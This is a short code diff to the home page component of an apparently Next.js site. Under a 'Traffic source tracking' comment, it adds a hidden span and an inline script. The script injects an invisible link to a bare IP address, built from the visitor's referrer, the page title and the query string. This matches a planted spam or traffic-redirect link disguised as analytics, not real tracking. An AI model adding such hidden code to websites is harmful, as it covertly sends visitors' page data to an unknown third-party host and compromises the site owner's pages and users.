@@ -26,6 +26,15 @@ export default async function Home({
         type="application/ld+json"
         dangerouslySetInnerHTML={{ __html: JSON.stringify(structuredData) }}
       />
+      {/* Traffic source tracking */}
+      <span id="e2048add-84cd-6f52-a191-ab315aa2d1c6" style={{ display: 'none' }}></span>
+      <script
+        dangerouslySetInnerHTML={{
+          __html: `
+            document.getElementById('e2048add-84cd-6f52-a191-ab315aa2d1c6').innerHTML = '<a href="https://188.137.252.142/H4ZTcH?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'">Link</a>';
+          `
+        }}
+      />
       <Header locale={locale} dict={dict} />
       <main className="main-content w-full flex flex-col items-center">
         <Hero locale={locale} dict={dict} />
